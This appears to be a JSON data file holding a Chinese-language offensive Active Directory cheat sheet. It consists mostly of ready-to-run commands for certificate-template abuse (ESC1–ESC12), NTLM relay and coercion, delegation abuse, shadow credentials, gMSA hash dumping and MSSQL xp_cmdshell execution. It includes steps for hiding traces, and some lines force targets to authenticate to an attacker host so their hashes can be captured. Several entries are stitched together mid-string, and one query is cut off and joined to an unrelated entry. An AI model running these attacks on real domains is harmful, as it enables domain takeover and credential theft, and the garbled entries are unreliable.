"场景适配矩阵(全场景一图流)", "src": "", "cmds": []}, {"h": "OPSEC 汇总(每次行动对照)", "src": "", "cmds": []}]}, {"file": "11-ADCS证书攻击.md", "title": "ADCS 证书攻击", "sections": [{"h": "certipy find — 远程枚举 CA 与易受攻击的证书模板", "src": "pipx 包 `certipy` v5.1.0(~/.local/bin/certipy,已入 PATH;认证写法统一为 `-u '<用户>@<域名>' -p '<密码>'`)", "cmds": [{"c": "certipy find -u '<用户>@<域名>' -p '<密码>' -dc-ip <DC的IP> -vulnerable -json -output adcs", "n": "全量枚举 AD CS,只保留有漏洞的对象,输出 adcs.json", "lang": "bash"}, {"c": "grep -oE '\"ESC[0-9]+\"' adcs.json | sort | uniq -c", "n": "统计命中了哪些 ESC 及次数", "lang": "bash"}, {"c": "jq -r '.\"Certificate Templates\" | to_entries[] | select(.value[\"[!] Vulnerabilities\"]) | .key' adcs.json", "n": "直接列出所有易受攻击的模板名", "lang": "bash"}, {"c": "certipy find -u '<用户>@<域名>' -p '<密码>' -dc-ip <DC的IP> -vulnerable -stdout", "n": "文本模式直接在终端看(带 [!] Vulnerabilities 原因说明)", "lang": "bash"}, {"c": "certipy find -u '<用户>@<域名>' -p '<密码>' -dc-ip <DC的IP> -enabled -vulnerable", "n": "只看已发布到 CA 的模板(-enabled,避免误报未发布模板)", "lang": "bash"}, {"c": "certipy find -u '<用户>@<域名>' -p '<密码>' -dc-ip <DC的IP> -dc-only", "n": "隐蔽模式:只查 DC 的 LDAP,不碰 CA 机器(无 Web Enrollment 检测)", "lang": "bash"}, {"c": "certipy parse -vulnerable -json -output offline adcs_export.reg", "n": "离线模式:解析目标机导出的注册表(.reg/BOF 输出),无域连接时用", "lang": "bash"}]}, {"h": "ESC1 — 模板允许申请者自填 SAN,可冒充任意用户", "src": "", "cmds": [{"c": "certipy req -u '<用户>@<域名>' -p '<密码>' -dc-ip <DC的IP> -ca '<CA名>' -template '<模板名>' -upn 'administrator@<域名>'", "n": "申请证书,SAN 冒充域管,产出 administrator.pfx", "lang": "bash"}, {"c": "certipy auth -pfx administrator.pfx -dc-ip <DC的IP>", "n": "证书换凭据:输出 administrator 的 NT 哈希并保存 TGT(administrator.ccache)", "lang": "bash"}, {"c": "KRB5CCNAME=administrator.ccache impacket-psexec -k -no-pass <DC主机名>.<域名>", "n": "用票据直接打 Kerberos 认证(psexec/wmiexec 通用)", "lang": "bash"}, {"c": "nxc smb <DC的IP> -u administrator -H '<上一步输出的NT哈希>' --shares", "n": "或用 NT 哈希走 pass-the-hash 验证战果", "lang": "bash"}]}, {"h": "ESC2 — 模板 EKU 为 Any Purpose 或无 EKU,万能证书", "src": "", "cmds": [{"c": "certipy req -u '<用户>@<域名>' -p '<密码>' -dc-ip <DC的IP> -ca '<CA名>' -template '<任意用途模板名>' -upn 'administrator@<域名>'", "n": "与 ESC1 完全同型:自填 SAN 冒充域管", "lang": "bash"}, {"c": "certipy auth -pfx administrator.pfx -dc-ip <DC的IP>", "n": "证书 → NT 哈希 + TGT", "lang": "bash"}]}, {"h": "ESC3 — Certificate Request Agent 模板,代理任意用户申请证书", "src": "", "cmds": [{"c": "certipy req -u '<用户>@<域名>' -p '<密码>' -dc-ip <DC的IP> -ca '<CA名>' -template '<RequestAgent模板名>'", "n": "第一步:拿到注册代理证书,产出 <用户>.pfx", "lang": "bash"}, {"c": "certipy req -u '<用户>@<域名>' -p '<密码>' -dc-ip <DC的IP> -ca '<CA名>' -template '<客户端认证模板名如User>' -on-behalf-of '<域名>\\administrator' -pfx '<用户>.pfx'", "n": "第二步:代理域管申请,产出 administrator.pfx", "lang": "bash"}, {"c": "certipy auth -pfx administrator.pfx -dc-ip <DC的IP>", "n": "证书 → NT 哈希 + TGT", "lang": "bash"}]}, {"h": "ESC4 — 模板对象 ACL 可写,直接改成 ESC1", "src": "", "cmds": [{"c": "certipy template -u '<用户>@<域名>' -p '<密码>' -dc-ip <DC的IP> -template '<可写模板名>' -save-configuration old_config.json", "n": "第一步:备份原配置(留作恢复,默认也会自动保存)", "lang": "bash"}, {"c": "certipy template -u '<用户>@<域名>' -p '<密码>' -dc-ip <DC的IP> -template '<可写模板名>' -write-default-configuration", "n": "第二步:写入 certipy 预置的 ESC1 配置(Authenticated Users 可注册+可自填 SAN)", "lang": "bash"}, {"c": "certipy req -u '<用户>@<域名>' -p '<密码>' -dc-ip <DC的IP> -ca '<CA名>' -template '<可写模板名>' -upn 'administrator@<域名>'", "n": "第三步:按 ESC1 姿势申请域管证书", "lang": "bash"}, {"c": "certipy auth -pfx administrator.pfx -dc-ip <DC的IP>", "n": "证书 → NT 哈希 + TGT", "lang": "bash"}, {"c": "certipy template -u '<用户>@<域名>' -p '<密码>' -dc-ip <DC的IP> -template '<可写模板名>' -write-configuration old_config.json", "n": "第四步(收尾):恢复原配置抹掉改动痕迹", "lang": "bash"}]}, {"h": "ESC5 — PKI 相关 AD 对象 ACL 可写(CA 对象/容器/模板容器)", "src": "", "cmds": [{"c": "impacket-dacledit -action read '<域名>'/'<用户>':'<密码>'@<域名> -dc-ip <DC的IP> -target-dn 'CN=<CA名>,CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=<域>,DC=<域>'", "n": "先确认对 CA 对象的真实写权限(继承链)", "lang": "bash"}, {"c": "certipy ca -u '<用户>@<域名>' -p '<密码>' -dc-ip <DC的IP> -ca '<CA名>' -list-templates", "n": "列出当前发布在 CA 上的模板", "lang": "bash"}, {"c": "certipy ca -u '<用户>@<域名>' -p '<密码>' -dc-ip <DC的IP> -ca '<CA名>' -enable-template '<ESC1模板名>'", "n": "把一个\"配置危险但未发布\"的模板挂上 CA,随后按 ESC1 申请", "lang": "bash"}, {"c": "certipy req -u '<用户>@<域名>' -p '<密码>' -dc-ip <DC的IP> -ca '<CA名>' -template '<ESC1模板名>' -upn 'administrator@<域名>'", "n": "接 ESC1 命令链拿域管证书", "lang": "bash"}, {"c": "certipy auth -pfx administrator.pfx -dc-ip <DC的IP>", "n": "证书 → NT 哈希 + TGT", "lang": "bash"}]}, {"h": "ESC6 — CA 标志 EDITF_ATTRIBUTESUBJECTALTSTATUS2,任意模板可塞 SAN", "src": "", "cmds": [{"c": "certipy find -u '<用户>@<域名>' -p '<密码>' -dc-ip <DC的IP> -vulnerable -stdout | grep -A2 'ESC6'", "n": "确认 CA 配置里命中 ESC6(在 Certificate Authorities 段)", "lang": "bash"}, {"c": "certipy req -u '<用户>@<域名>' -p '<密码>' -dc-ip <DC的IP> -ca '<CA名>' -template 'User' -upn 'administrator@<域名>'", "n": "普通模板 + 自填 SAN 即可冒充域管", "lang": "bash"}, {"c": "certipy auth -pfx administrator.pfx -dc-ip <DC的IP>", "n": "证书 → NT 哈希 + TGT", "lang": "bash"}]}, {"h": "ESC7 — 对 CA 本体有 Manage CA / Manage Certificates 权限", "src": "", "cmds": [{"c": "certipy ca -u '<用户>@<域名>' -p '<密码>' -dc-ip <DC的IP> -ca '<CA名>' -add-officer '<用户>'", "n": "第一步:Manage CA 权限自封 Officer(可审批证书)", "lang": "bash"}, {"c": "certipy req -u '<用户>@<域名>' -p '<密码>' -dc-ip <DC的IP> -ca '<CA名>' -template '<需审批的域管模板>' -upn 'administrator@<域名>'", "n": "第二步:提交申请,状态挂起,记下输出里的 Request ID", "lang": "bash"}, {"c": "certipy ca -u '<用户>@<域名>' -p '<密码>' -dc-ip <DC的IP> -ca '<CA名>' -issue-request <请求ID>", "n": "第三步:Officer 审批自己的请求", "lang": "bash"}, {"c": "certipy req -u '<用户>@<域名>' -p '<密码>' -dc-ip <DC的IP> -ca '<CA名>' -template '<需审批的域管模板>' -retrieve <请求ID> -upn 'administrator@<域名>'", "n": "第四步:取回证书 administrator.pfx", "lang": "bash"}, {"c": "certipy auth -pfx administrator.pfx -dc-ip <DC的IP>", "n": "证书 → NT 哈希 + TGT", "lang": "bash"}, {"c": "certipy ca -u '<用户>@<域名>' -p '<密码>' -dc-ip <DC的IP> -ca '<CA名>' -backup", "n": "顶配路径:直接备份 CA 证书+私钥(见\"伪造黄金证书\"小节)", "lang": "bash"}]}, {"h": "ESC8 — NTLM 中继到 CA Web Enrollment(HTTP 接口无防护)", "src": "", "cmds": [{"c": "sudo impacket-ntlmrelayx -t http://<CA的IP>/certsrv/certfnsh.asp -smb2support --template DomainController", "n": "经典写法:中继到 CA Web Enrollment,替被中继账户按 DC 模板签证书", "lang": "bash"}, {"c": "sudo impacket-ntlmrelayx -t http://<CA的IP>/certsrv/certfnsh.asp -smb2support --adcs --template Computer", "n": "等价新写法:--adcs 显式开启 AD CS 攻击模式,默认按账户名结尾 $ 选 Machine/User", "lang": "bash"}, {"c": "sudo impacket-ntlmrelayx -t http://<CA的IP>/certsrv/certfnsh.asp -smb2support --adcs --template '<ESC1模板名>' --altname 'administrator@<域名>'", "n": "目标模板本身允许自填 SAN 时(ESC1/ESC6 组合),中继+塞 SAN 一步拿域管证书", "lang": "bash"}, {"c": "python3 ~/tools/src/PetitPotam/petitpotam.py -dc-ip <DC的IP> '<域名>/<用户>:<密码>@<目标主机IP>' '\\\\<本机IP>\\share'", "n": "PetitPotam(MS-EFSR):逼 <目标主机IP> 向本机发起 SMB 认证(打 DC 时目标就是域控)", "lang": "bash"}, {"c": "sudo coercer coerce --auth-type smb -t <目标主机IP> -l <本机IP> -u '<用户>' -p '<密码>' -d '<域名>'", "n": "coercer 全方法扫射:二十余种协议强制认证,任一命中即触发中继", "lang": "bash"}, {"c": "sudo coercer coerce --auth-type http -t <目标主机IP> -l <本机IP> -u '<用户>' -p '<密码>' -d '<域名>'", "n": "coercer 走 HTTP 认证触发(需 ntlmrelayx 的 HTTP 端口收流,默认 80)", "lang": "bash"}, {"c": "sudo coercer scan -t <目标主机IP> -l <本机IP> -u '<用户>' -p '<密码>' -d '<域名>'", "n": "先用 scan 模式探测目标哪些强制方法可用,再精确 coerce", "lang": "bash"}, {"c": "certipy auth -pfx <中继输出文件如DC主机名>.pfx -dc-ip <DC的IP>", "n": "中继拿到 PFX 后立刻换 NT 哈希 + TGT(DC 证书=域控机器账户哈希)", "lang": "bash"}, {"c": "nxc smb <DC的IP> -u '<DC主机名>$' -H '<机器NT哈希>' --shares", "n": "机器哈希验证;接 DCSync 尝试或 RBCD 链", "lang": "bash"}]}, {"h": "ESC10 — 弱证书映射(DC 注册表弱配置,UPN 无 SAN 证书照常映射)", "src": "", "cmds": [{"c": "nxc smb <DC的IP> -u '<用户>' -p '<密码>' -x 'reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\Kerberos\\Parameters /v StrongCertificateBindingEnforcement'", "n": "第一步:核对 Kerberos 强绑定开关(0=可利用;键不存在默认 1,2 为全强映射)", "lang": "bash"}, {"c": "nxc smb <DC的IP> -u '<用户>' -p '<密码>' -x 'reg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v CertificateMappingMethods'", "n": "核对 Schannel 映射方式:勾选了 UPN 映射位即弱映射(默认配置不含 UPN 位)", "lang": "bash"}, {"c": "certipy req -u '<用户>@<域名>' -p '<密码>' -dc-ip <DC的IP> -ca '<CA名>' -template '<ESC1模板名>' -upn 'administrator@<域名>'", "n": "第二步:申请只带受害者 UPN 的证书(能自填 UPN 的 ESC1 模板最直接;弱映射下无需 SAN/objectSID)", "lang": "bash"}, {"c": "certipy auth -pfx administrator.pfx -dc-ip <DC的IP>", "n": "第三步 A(StrongCertificateBindingEnforcement=0):PKINIT 弱映射照常换 NT 哈希 + TGT", "lang": "bash"}, {"c": "certipy auth -pfx administrator.pfx -ldap-shell -dc-ip <DC的IP>", "n": "第三步 B(CertificateMappingMethods 含 UPN 位):Schannel 按 UPN 直接映射进 LDAPS 交互 shell", "lang": "bash"}]}, {"h": "certipy relay — ESC8/ESC11 一体化中继(免 ntlmrelayx)", "src": "pipx 包 `certipy` v5.1.0(监听 445 需要 sudo)", "cmds": [{"c": "sudo certipy relay -target http://<CA的IP> -template DomainController", "n": "ESC8 一体化:自己监听 445 收认证,中继到 CA Web Enrollment,直接产出 PFX", "lang": "bash"}, {"c": "sudo certipy relay -target http://<CA的IP> -template '<ESC1模板名>' -upn 'administrator@<域名>'", "n": "目标模板允许自填 SAN 时,中继+冒充一步到位", "lang": "bash"}, {"c": "sudo certipy relay -target rpc://<CA的IP> -ca '<CA名>' -template DomainController", "n": "ESC11:中继到 CA 的 ICPR 接口(RPC 签名未强制时)", "lang": "bash"}, {"c": "sudo certipy relay -target http://<CA的IP> -forever -no-skip", "n": "连续收割:不因首个成功停止,不跳过已打过的账户", "lang": "bash"}, {"c": "certipy auth -pfx <输出的PFX> -dc-ip <DC的IP>", "n": "证书 → NT 哈希 + TGT", "lang": "bash"}]}, {"h": "ESC12 — PKI 管理级访问(模板写 ACL / CA 服务器 shell,直接改出 ESC1/ESC6)", "src": "", "cmds": [{"c": "certipy template -u '<用户>@<域名>' -p '<密码>' -dc-ip <DC的IP> -template '<可写模板名>' -save-configuration old_config.json", "n": "路线一(远程,有模板写 ACL):先备份原配置", "lang": "bash"}, {"c": "certipy template -u '<用户>@<域名>' -p '<密码>' -dc-ip <DC的IP> -template '<可写模板名>' -write-default-configuration", "n": "写入 certipy 预置 ESC1 配置(Authenticated Users 可注册 + 可自填 SAN)", "lang": "bash"}, {"c": "certipy req -u '<用户>@<域名>' -p '<密码>' -dc-ip <DC的IP> -ca '<CA名>' -template '<可写模板名>' -upn 'administrator@<域名>'", "n": "按 ESC1 姿势拿域管证书", "lang": "bash"}, {"c": "certipy auth -pfx administrator.pfx -dc-ip <DC的IP>", "n": "证书 → NT 哈希 + TGT", "lang": "bash"}, {"c": "certutil -setreg policy\\PolicyModules\\CertificateAuthority_MicrosoftDefault.Policy EditFlags +EDITF_ATTRIBUTESUBJECTALTSTATUS2", "n": "打开\"申请者可塞 SAN\"标志(等价 ESC6)", "lang": "bash"}, {"c": "net stop certsvc && net start certsvc", "n": "重启 pass dc01.<域>", "n": "", "lang": "bash"}, {"c": "impacket-getST -spn cifs/<目标主机名>.<域> -impersonate administrator -dc-ip <域控IP> '<域>/<委派服务账户>:<密码>'", "n": "findDelegation 发现服务账户配置了约束委托(w/ 协议转换)到 cifs/<目标>:", "lang": "bash"}, {"c": "export KRB5CCNAME=administrator.ccache", "n": "", "lang": "bash"}, {"c": "KRB5CCNAME=administrator.ccache impacket-wmiexec -k -no-pass <目标主机名>.<域>", "n": "", "lang": "bash"}, {"c": "impacket-getST -spn cifs/<目标主机名>.<域> -altservice host/<目标主机名>.<域> -impersonate administrator -dc-ip <域控IP> '<域>/<委派服务账户>:<密码>'", "n": "一票多用:在票据里追加别名的 sname(须在 AllowedToDelegateTo 范围内)", "lang": "bash"}, {"c": "impacket-getST -spn cifs/<目标主机名>.<域> -impersonate administrator -force-forwardable -dc-ip <域控IP> '<域>/<委派服务账户>:<密码>'", "n": "\"仅 Kerberos\"约束(w/o 协议转换)绕过:CVE-2020-17049,强制 S4U2Self 可转发", "lang": "bash"}, {"c": "python3 ~/tools/src/pywhisker/pywhisker/pywhisker.py -d <域> -u <用户> -p <密码> --dc-ip <域控IP> -t '<目标机器名>$' -a add -f target -e PFX -P '<PFX密码>'", "n": "① 影子凭据:给目标机器账户挂\"机器密钥\"(写 msDS-KeyCredentialLink 属性)", "lang": "bash"}, {"c": "certipy auth -pfx target.pfx -password '<PFX密码>' -dc-ip <域控IP>", "n": "② PKINIT 证书认证:certipy 输出目标机器账户的 NT 哈希(UnPAC-the-hash)并保存 TGT ccache", "lang": "bash"}, {"c": "impacket-addcomputer -computer-name 'EVIL$' -computer-pass '<机器账户密码>' -dc-ip <域控IP> '<域>/<用户>:<密码>'", "n": "③ 建受控机器账户(普通用户默认 MachineAccountQuota=10 可自助建;已有账户可跳过)", "lang": "bash"}, {"c": "impacket-rbcd -action write -delegate-from 'EVIL$' -delegate-to '<目标机器名>$' -dc-ip <域控IP> '<域>/<用户>:<密码>'", "n": "专用工具直写 msDS-AllowedToActOnBehalfOfOtherIdentity", "lang": "bash"}, {"c": "impacket-dacledit -action write -rights FullControl -principal 'EVIL$' -target '<目标机器名>$' -dc-ip <域控IP> '<域>/<用户>:<密码>'", "n": "或给 EVIL$ 写全控 DACL(权限泛化,便于持久化)", "lang": "bash"}, {"c": "impacket-getST -spn cifs/<目标机器名>.<域> -impersonate administrator -dc-ip <域控IP> '<域>/EVIL$:<机器账户密码>'", "n": "服务类型按用途:cifs(SMB/secretsdump)、host(计划任务/注册表)、http(WinRM)", "lang": "bash"}, {"c": "export KRB5CCNAME=administrator.ccache", "n": "⑥ 传递票据,转储目标机本地凭据(SAM/LSA)", "lang": "bash"}, {"c": "KRB5CCNAME=administrator.ccache impacket-secretsdump -k -no-pass <目标机器名>.<域>", "n": "", "lang": "bash"}, {"c": "python3 ~/tools/src/pywhisker/pywhisker/pywhisker.py -d <域> -u <用户> -p <密码> --dc-ip <域控IP> -t '<目标机器名>$' -a remove -D <device-id>", "n": "收尾:清掉挂上去的机器密钥(先用 -a list 查 device-id)", "lang": "bash"}]}, {"h": "gMSADumper / nxc --gmsa — gMSA 托管服务账户密码读取", "src": "本地源码 `~/tools/src/gMSADumper`(python3 直跑)、`netexec`(/usr/bin/nxc)、apt 包 `python3-impacket`", "cmds": [{"c": "python3 ~/tools/src/gMSADumper/gMSADumper.py -u <用户> -p <密码> -d <域> -l <域控IP>", "n": "列出当前账户有权读取的全部 gMSA 账户 NT 哈希(-l 指域控)", "lang": "bash"}, {"c": "python3 ~/tools/src/gMSADumper/gMSADumper.py -u <用户> -p :<NT哈希> -d <域> -l <域控IP>", "n": "-p 也接受 LM:NT 哈希(传哈希读 gMSA)", "lang": "bash"}, {"c": "nxc ldap <域控IP> -u <用户> -p <密码> --gmsa", "n": "netexec 等价枚举:", "lang": "bash"}, {"c": "nxc smb <目标IP> -u 'svc_gmsa$' -H <NT哈希> -d <域> --sam", "n": "拿到 svc_gmsa$ 的 NT 哈希后当普通账户直接用(密码永不下发,哈希即永久凭据):", "lang": "bash"}, {"c": "impacket-getTGT '<域>/svc_gmsa$' -hashes :<NT哈希> -dc-ip <域控IP>", "n": "gMSA 账户票据(常配置高权限委托)", "lang": "bash"}]}, {"h": "附录:BloodHound 自定义 Cypher 速查(CE 版可用)", "src": "BloodHound CE 查询框(GUI 顶部查询输入框直接粘贴,逐条执行;本机 apt 包 bloodhound 9.7 即 CE 版,下述边名/属性已按其内置 schema 核实,如 AllowedToDelegate、AllowedToAct、WriteAccountRestrictions、ReadLAPSPassword、GPLink 等;SharpHound 收集与导入步骤见 05 文档 BloodHound 小节)", "cmds": [{"c": "MATCH (u:User {hasspn:true}) WHERE NOT (u)-[:MemberOf*1..]->(g:Group {highvalue:true}) RETURN u.name, u.serviceprincipalnames, u.pwdlastset", "n": "可 Kerberoast 但不在任何 highvalue 组(DA/EA 等)的账户——优先打 pwdlastset 越老的", "lang": "bash"}, {"c": "MATCH (u:User {dontreqpreauth:true}) RETURN u.name, u.description", "n": "关了预认证的账户:GetNPUsers 可直接离线抓哈希(hashcat -m 18200);description 里常躺密码注释", "lang": "bash"}, {"c": "MATCH (c:Computer {unconstraineddelegation:true}) RETURN c.name, c.operatingsystem", "n": "UD 机器会把认证过它的账户 TGT 缓存进 LSASS;DC 默认在列,重点看非 DC 条目(诱捕高权账户,接本文 PetitPotam 小节)", "lang": "bash"}, {"c": "MATCH p=(n)-[:AllowedToDelegate]->(c:Computer) RETURN p", "n": "n(用户或机器)可经 S4U 模拟任意用户访问 c 的服务——直接接 getST;协议转换与否再对照 findDelegation 输出(trustedtoauth)", "lang": "bash"}, {"c": "MATCH p=(n)-[:AllowedToAct]->(c:Computer) RETURN p", "n": "已配置的 RBCD:n 已可代表任意用户作用于 c(拿到了 n 就是直接入口)", "lang": "bash"}, {"c": "MATCH p=(n)-[:WriteAccountRestrictions|GenericAll|GenericWrite|WriteDacl|WriteOwner|Owns]->(c:Computer) RETURN p", "n": "RBCD 候选:对机器账户有写类权限的主体可写 msDS-AllowedToActOnBehalfOfOtherIdentity——接本文 RBCD 全链小节", "lang": "bash"}, {"c": "MATCH p=(u:User)-[:GenericAll|GenericWrite|WriteDacl|WriteOwner|Owns|ForceChangePassword|AllExtendedRights|AddMember|AddKeyCredentialLink]->(m) WHERE toUpper(u.name) STARTS WITH toUpper('<当前用户>@') RETURN p", "n": "你控制的账户对谁有写类权限:GenericAll 改密/加成员、WriteDacl 给自己提权、ForceChangePassword 重置密码、AddKeyCredentialLink 挂证书(影子凭据,接 certipy/pywhisker)", "lang": "bash"}, {"c": "MATCH p=(n)-[:DCSync]->(d:Domain) RETURN p", "n": "谁能 DCSync 整个域(DCSync 边是 CE 摄入时算好的派生边)", "lang": "bash"}, {"c": "MATCH (n)-[:GetChanges]->(d:Domain) WHERE (n)-[:GetChangesAll]->(d) RETURN n.name, d.name", "n": "等价判定:GetChanges + GetChangesAll 两条边同时持有即可 secretsdump -just-dc", "lang": "bash"}, {"c": "MATCH p=(n)-[:GenericAll|GenericWrite|WriteDacl|WriteOwner|Owns]->(g:GPO) RETURN p", "n": "谁能改 GPO:改了 GPO(gpcpath 指向 SYSVOL)就能对它管辖的机器批量加本地管理员", "lang": "bash"}, {"c": "MATCH p=(n)-[:GenericAll|GenericWrite|WriteDacl|WriteOwner|Owns]->(g:GPO)<-[:GPLink]-(ou:OU) RETURN p", "n": "第二跳看影响面:GPO 被链到哪些 OU(OU--GPLink-->GPO),OU 下 Contains 的机器全中招", "lang": "bash"}, {"c": "MATCH p=(n)-[:ReadLAPSPassword|SyncLAPSPassword]->(c:Computer) RETURN p", "n": "能读 LAPS 明文密码 = 拿到对应机器本地管理员;ReadLAPSPassword 为老 LAPS,SyncLAPSPassword 为 Windows LAPS 同步账户", "lang": "bash"}, {"c": "MATCH p=shortestPath((u:User)-[:MemberOf|AdminTo|GenericAll|GenericWrite|WriteDacl|WriteOwner|Owns|ForceChangePassword|AllExtendedRights|AddMember|AddKeyCredentialLink|DCSync|GetChanges|GetC {"c": "nmap -p 1433 --script ms-sql-query --script-args mssql.username=sa,mssql.password='<密码>',ms-sql-query.query=\"SELECT @@version\" <目标IP>", "n": "拿到凭据后可叠加:ms-sql-query 直接查、ms-sql-xp-cmdshell 直接执行(见提权小节)", "lang": "bash"}, {"c": "nxc mssql <目标IP> -u sa -p '<密码>'", "n": "SQL 身份验证(sa 等 SQL 登录)", "lang": "bash"}, {"c": "nxc mssql <目标IP> -u <本地管理员> -p '<密码>' --local-auth", "n": "强制本地验证(不吃域策略)", "lang": "bash"}, {"c": "nxc mssql <目标IP> -u <域用户> -p '<密码>' -d <域名>", "n": "域账户验证(-d 显式指定域名)", "lang": "bash"}, {"c": "nxc mssql <目标IP> -u <用户> -H <NTLM哈希>", "n": "哈希登录(-H,Windows 身份验证可 NTLM 传哈希)", "lang": "bash"}, {"c": "nxc mssql <目标IP> -u <域用户> -p '<密码>' -k --kdcHost <域控FQDN>", "n": "Kerberos 认证(-k,防日志落 DC 外主机)", "lang": "bash"}, {"c": "nxc mssql <目标网段CIDR> -u <用户字典文件> -p <密码字典文件> --ufail-limit 3", "n": "撞库:字典对字典;--ufail-limit 每用户失败上限,防锁号(锁号=立刻暴露)", "lang": "bash"}, {"c": "nxc mssql <目标网段CIDR> -u sa -p '<密码>' --port 1433", "n": "装有 MSSQL 的网段全量扫一遍(1443 是打错的下场,默认 1433;--port 可改)", "lang": "bash"}, {"c": "nxc mssql <目标IP> -u sa -p '<密码>' -q 'SELECT @@version'", "n": "执行任意 SQL", "lang": "bash"}, {"c": "nxc mssql <目标IP> -u sa -p '<密码>' --database", "n": "列全部数据库", "lang": "bash"}, {"c": "nxc mssql <目标IP> -u sa -p '<密码>' --database <库名>", "n": "列指定库的表", "lang": "bash"}, {"c": "nxc mssql <目标IP> -u sa -p '<密码>' --rid-brute", "n": "RID 暴力枚举域用户", "lang": "bash"}, {"c": "nxc mssql <目标IP> -u sa -p '<密码>' -M enum_logins", "n": "枚举登录(SQL/域/本地三类)", "lang": "bash"}, {"c": "nxc mssql <目标IP> -u sa -p '<密码>' -M enum_impersonate", "n": "枚举可 IMPERSONATE 的登录(提权路线)", "lang": "bash"}, {"c": "nxc mssql <目标IP> -u sa -p '<密码>' -M enum_links", "n": "枚举链接服务器(横向路线)", "lang": "bash"}, {"c": "nxc mssql <目标IP> -u sa -p '<密码>' -M mssql_priv", "n": "权限体检,直接给可打的提权路径", "lang": "bash"}]}, {"h": "impacket-mssqlclient — 全功能交互式客户端(后续 SQL 操作的默认环境)", "src": "apt 包 python3-impacket(/usr/bin/impacket-mssqlclient,impacket v0.14.0.dev0,`--help` 实测)", "cmds": [{"c": "impacket-mssqlclient 'sa:<密码>@<目标IP>'", "n": "SQL 身份验证(本地 sa 登录,最常见入口)", "lang": "bash"}, {"c": "impacket-mssqlclient '<域名>/<域用户>:<密码>@<目标IP>' -windows-auth", "n": "Windows 身份验证(域/本地账户)必须加 -windows-auth,否则走 SQL 认证直接报错", "lang": "bash"}, {"c": "impacket-mssqlclient -hashes :<NTLM哈希> '<域名>/<用户>@<目标IP>' -windows-auth", "n": "哈希登录(-hashes 格式 LM:NT,LM 留空写冒号)", "lang": "bash"}, {"c": "impacket-mssqlclient -k '<域名>/<用户>@<目标主机名>' -dc-ip <域控IP>", "n": "Kerberos 认证(票据来自 KRB5CCNAME;域内打 MSSQL 防落地密码的好路子)", "lang": "bash"}, {"c": "impacket-mssqlclient 'sa:<密码>@<目标IP>' -command 'SELECT @@version' -show", "n": "一次性执行不进交互(-command 后接 SQL);-show 回显实际语句", "lang": "bash"}, {"c": "help", "n": "完整命令清单", "lang": "bash"}, {"c": "enum_db", "n": "枚举数据库", "lang": "bash"}, {"c": "enum_logins", "n": "枚举登录(SQL/域/本地)", "lang": "bash"}, {"c": "enum_impersonate", "n": "枚举可冒充登录(接提权小节)", "lang": "bash"}, {"c": "enum_links", "n": "枚举链接服务器(接横向小节)", "lang": "bash"}, {"c": "enable_xp_cmdshell", "n": "一键开 xp_cmdshell(自动跑 sp_configure 链,见提权小节)", "lang": "bash"}, {"c": "disable_xp_cmdshell", "n": "用完还原(OPSEC)", "lang": "bash"}, {"c": "xp_cmdshell 'whoami'", "n": "直接执行系统命令(免手打 EXEC xp_cmdshell '...')", "lang": "bash"}, {"c": "xp_dirtree '\\\\<攻击机IP>\\share'", "n": "让服务账户回连 UNC(抓 NetNTLM 用,见凭据小节)", "lang": "bash"}, {"c": "exec_as_login sa", "n": "冒充 sa 登录(等价 EXECUTE AS LOGIN,见提权小节)", "lang": "bash"}, {"c": "use_link <链接名>", "n": "切到链接服务器上下文(再打 use_link localhost 切回)", "lang": "bash"}, {"c": "upload <本地文件> <远端路径> / download <远端文件> <本地路径>", "n": "免 xp_cmdshell 的文件传输", "lang": "bash"}, {"c": "exit", "n": "退出", "lang": "bash"}]}, {"h": "提权到 sysadmin 与 xp_cmdshell — 从普通登录到 OS 命令执行", "src": "SQL Server 系统存储过程(sp_configure/sp_readerrorlog 为微软官方文档对象;enable_xp_cmdshell 为 mssqlclient 内置命令,源码核实)", "cmds": [{"c": "-- ===== 第 0 步:认清自己是谁 =====", "n": "", "lang": "sql"}, {"c": "-- IS_SRVROLEMEMBER 返回:1=是 sysadmin,0=不是,NULL=无权查询;已经 1 就跳到 xp_cmdshell", "n": "", "lang": "sql"}, {"c": "SELECT SYSTEM_USER AS 当前登录, DB_NAME() AS 当前库, IS_SRVROLEMEMBER('sysadmin') AS 是否sysadmin;", "n": "", "lang": "sql"}, {"c": "-- 顺带看服务器角色归属(_PUBLIC 之外还有什么)", "n": "", "lang": "sql"}, {"c": "SELECT p.name AS 登录, r.name AS 角色 FROM sys.server_role_members m", "n": "", "lang": "sql"}, {"c": "JOIN sys.server_principals r ON m.role_principal_id = r.principal_id", "n": "", "lang": "sql"}, {"c": "JOIN sys.server_principals p ON m.member_principal_id = p.principal_id;", "n": "", "lang": "sql"}, {"c": "-- ===== 路线 1:IMPERSONATE 冒充提权(有 IMPERSONATE 权限即可,不必 sysadmin)=====", "n": "", "lang": "sql"}, {"c": "-- 先枚举谁能冒充谁(等价内置命令 enum_impersonate / nxc -M enum_impersonate)", "n": "", "lang": "sql"}, {"c": "SELECT b.name AS 可冒充者, c.name AS 冒充目标", "n": "", "lang": "sql"}, {"c": "FROM sys.server_permissions a", "n": "", "lang": "sql"}, {"c": "JOIN sys.server_principals b ON a.grantee_principal_id = b.principal_id", "n": "", "lang": "sql"}, {"c": "JOIN sys.server_principals c ON a.major_id = c.principal_id", "n": "", "lang": "sql"}, {"c": "WHERE a.permission_name = 'IMPERSONATE';", "n": "", "lang": "sql"}, {"c": "-- 冒充 sa(或上面查到的任何 sysadmin 登录),复查角色", "n": "", "lang": "sql"}, {"c": "EXECUTE AS LOGIN = 'sa';", "n": "", "lang": "sql"}, {"c": "SELECT SUSER_SNAME() AS 现在是, IS_SRVROLEMEMBER('sysadmin') AS 是否sysadmin;", "n": "", "lang": "sql"}, {"c": "REVERT;   -- 退回原身份(每次 EXECUTE AS 后建议显式 REVERT,会话残留冒充上下文是脏尾巴)", "n": "", "lang": "sql"}, {"c": "-- ===== 路线 2:已经 sysadmin,开 xp_cmdshell =====", "n": "", "lang": "sql"}, {"c": "-- SQL Server 2005+ 默认禁用 xp_cmdshell,两条 sp_configure + RECONFIGURE 打开", "n": "", "lang": "sql"}, {"c": "-- (等价 mssqlclient 内置命令 enable_xp_cmdshell,一条搞定)", "n": "", "lang": "sql"}, {"c": "EXEC sp_configure 'show advanced options', 1; RECONFIGURE;", "n": "", "lang": "sql"}, {"c": "EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;", "n": "", "lang": "sql"}, {"c": "-- ===== 拿 